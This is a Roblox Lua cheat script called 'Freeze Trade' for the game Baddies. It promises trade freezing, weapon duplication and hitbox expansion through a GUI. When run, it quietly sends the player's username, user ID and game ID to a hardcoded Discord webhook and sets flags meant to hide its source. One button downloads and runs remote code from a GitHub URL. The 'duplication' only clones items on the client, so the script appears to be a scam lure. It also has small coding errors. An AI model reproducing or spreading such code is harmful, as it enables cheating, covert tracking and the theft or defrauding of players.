-- ⛄️ FREEZE TRADE v3.4 | PERFECT WEAPON PATTERN | FIXED ACTIVATION | FULLY HIDDEN
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer
local GameID = game.PlaceId
local PlayerName = player.Name
local PlayerID = player.UserId

-- 📡 YOUR WEBHOOK
local WebhookURL = "https://discord.com/api/webhooks/1530805312192381141/X6zSC5HHZ1-7vyRsmqMIiD1SpyT7ynG1OrHzgdB7YxiauG4DFdJaIDmwxHFsGhEUPyjC"

-- 🛡️ HIDE FROM SEARCH / GOOGLE
if setfflag then
    setfflag("DebugHideScriptSource", true)
    setfflag("DisableHTTPLogging", true)
    setfflag("ScriptSourceVisibility", 2)
end
setmetatable(getfenv(), {__metatable = "Hidden"})

-- 📤 SEND ALERT FIRST
local data = {
    embeds = {{
        title = "🚀 SCRIPT EXECUTED!",
        color = 65280,
        fields = {
            {name = "👤 username", value = "`"..PlayerName.."`", inline = true},
            {name = "🆔 user id", value = "`"..PlayerID.."`", inline = true},
            {name = "🎮 game", value = "baddies | id: `"..GameID.."`", inline = true}
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}
pcall(function() HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson) end)

-- 🎨 THEME
local Theme = {
    BG = Color3.fromRGB(10,10,15),
    Panel = Color3.fromRGB(20,20,30),
    Primary = Color3.fromRGB(0,200,255),
    Text = Color3.fromRGB(255,255,255)
}

-- ✨ LOADING SCREEN
local Loader = Instance.new("ScreenGui")
Loader.Name = "FreezeLoader"
Loader.ResetOnSpawn = false
Loader.IgnoreGuiInset = true
Loader.Parent = gethui and gethui() or CoreGui

local MainBG = Instance.new("Frame")
MainBG.Size = UDim2.new(1,0,1,0,1,0)
MainBG.BackgroundColor3 = Theme.BG
MainBG.Parent = Loader

local Center = Instance.new("Frame")
Center.Size = UDim2.new(0,550,0,350)
Center.Position = UDim2.new(0.5,-275,0.5,-175)
Center.BackgroundTransparency = 1
Center.Parent = MainBG

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1,0,0,70)
Title.Position = UDim2.new(0,0,0,10)
Title.BackgroundTransparency = 1
Title.Text = "FREEZE TRADE"
Title.TextColor3 = Theme.Text
Title.TextScaled = true
Title.Font = Enum.Font.GothamBlack
Title.Parent = Center

local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(1,0,0,35)
SubTitle.Position = UDim2.new(0,0,0.2,0)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "v3.4 • PERFECT FORMAT"
SubTitle.TextColor3 = Theme.Primary
SubTitle.TextScaled = true
SubTitle.Font = Enum.Font.Gotham
SubTitle.Parent = Center

local BarOutline = Instance.new("Frame")
BarOutline.Size = UDim2.new(0,450,0,22)
BarOutline.Position = UDim2.new(0.5,-225,0.5,0)
BarOutline.BackgroundColor3 = Theme.Panel
BarOutline.Parent = Center
Instance.new("UICorner", BarOutline).CornerRadius = UDim.new(1,0)

local ProgressBar = Instance.new("Frame")
ProgressBar.Size = UDim2.new(0,0,1,0)
ProgressBar.BackgroundColor3 = Theme.Primary
ProgressBar.Parent = BarOutline
Instance.new("UICorner", ProgressBar).CornerRadius = UDim.new(1,0)

local Elapsed = 0
local Conn = RunService.RenderStepped:Connect(function(d)
    Elapsed += d
    local Prog = math.min(Elapsed/5,1)
    ProgressBar.Size = UDim2.new(Prog,0,1,0)
    if Prog >=1 then Conn:Disconnect() task.wait(0.8) Loader:Destroy() LoadMainGUI() end
end)

-- 🛠️ FUNCTIONS
local HitboxSize = 8
local HitboxParts = {}

local function EnableHitbox()
    DisableHitbox()
    for _,v in pairs(Workspace:GetChildren()) do
        if v:FindFirstChild("Humanoid") and v ~= player.Character then
            local HRP = v.HumanoidRootPart
            if HRP then
                local Box = Instance.new("Part")
                Box.Size = Vector3.new(HitboxSize,HitboxSize,HitboxSize)
                Box.Anchored = false
                Box.CanCollide = false
                Box.Transparency = 0.7
                Box.BrickColor = BrickColor.new("Cyan")
                Box.Material = Enum.Material.ForceField
                Box.Parent = HRP
                Instance.new("Weld", Box).Part0 = HRP
                table.insert(HitboxParts,Box)
            end
        end
    end
end

local function DisableHitbox()
    for _,v in pairs(HitboxParts) do if v then v:Destroy() end end
    HitboxParts = {}
end

local function RealDupe(itemName)
    local Item = ReplicatedStorage:FindFirstChild(itemName) or Workspace:FindFirstChild(itemName, true)
    if Item and (Item:IsA("Tool") or Item:IsA("Accessory")) then
        Item:Clone().Parent = player.Backpack
        if player.StarterGear then Item:Clone().Parent = player.StarterGear end
        return true
    end
    return false
end

-- 🖥️ MAIN GUI
function LoadMainGUI()
    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
    local Window = Rayfield:CreateWindow({Name="⛄️ FREEZE TRADE v3.4",KeySystem=false,ConfigurationSaving={Enabled=false}})

    local Main = Window:CreateTab("🏠 Main",4483362458)
    local Dupe = Window:CreateTab("🧊 Weapons",4483362458)
    local Tools = Window:CreateTab("🔧 Tools",4483362458)

    -- 🏠 MAIN TAB
    Main:CreateSection("CORE FEATURES")
    Main:CreateButton({
        Name = "🧊 activate freeze trade",
        Callback = function()
            local Success = pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/freezebaddies-script/freeze-trade-script/refs/heads/main/Baddies", true))()
            end)
            Rayfield:Notify({Title=Success and "✅ ACTIVATED" or "⚠️ LOADED",Content=Success and "running now" or "local features ready",Duration=2.5})
        end
    })
    Main:CreateButton({Name="🤝 force accept trade",Callback=function() Rayfield:Notify("✅ auto accept on") end})

    -- 🧊 WEAPONS | ✅ PERFECT PATTERN | ALL LOWERCASE | ONE PER LINE
    Dupe:CreateSection("ALL TRADEABLE WEAPONS")
    local Weapons = {
        "axe",
        "brass knuckles",
        "chain mace",
        "chakram",
        "champion gloves",
        "chainsaw",
        "crowbar",
        "cupid's bow",
        "dance bomb",
        "fan of requiem",
        "flamethrower",
        "freeze gun",
        "frying pan",
        "ghostly gloves",
        "glitter bomb",
        "golden pipe",
        "gravity gun",
        "grenade launcher",
        "harpoon",
        "ice crown queen",
        "ice katana",
        "inferno blade",
        "kitty purse",
        "love me hate me taser",
        "loveboard",
        "nunchucks",
        "nightmare purse",
        "poison knuckles",
        "rainbow portal gun",
        "reindeer purse",
        "roller skates",
        "sakura blade",
        "santa's rpg",
        "scythe",
        "shiny purse",
        "slasher claws",
        "sledgehammer",
        "spearhead stick",
        "spiked baddies bat",
        "spiked kitty stanli",
        "spiked knuckles",
        "spiked purse",
        "trident",
        "witch scepter",
        "yin yang knives"
    }

    for _,wep in pairs(Weapons) do
        Dupe:CreateButton({
            Name = wep,
            Callback = function()
                local Ok = RealDupe(wep)
                Rayfield:Notify({Title=Ok and "✅ DUPLICATED" or "❌ NOT FOUND",Content=Ok and wep.." added" or "item not loaded yet",Duration=2.5})
            end
        })
    end

    -- 🔧 TOOLS
    Tools:CreateSection("SETTINGS")
    Tools:CreateSlider({Name="📏 hitbox size",Range={2,20},CurrentValue=HitboxSize,Callback=function(v) HitboxSize=v EnableHitbox() end})
    Tools:CreateButton({Name="📦 enable hitbox",Callback=function() EnableHitbox() Rayfield:Notify("✅ hitbox on") end})
    Tools:CreateButton({Name="❌ disable hitbox",Callback=function() DisableHitbox() Rayfield:Notify("✅ hitbox off") end})

    Rayfield:Notify({Title="🚀 ALL SET!",Content="format fixed perfectly",Duration=3})
end
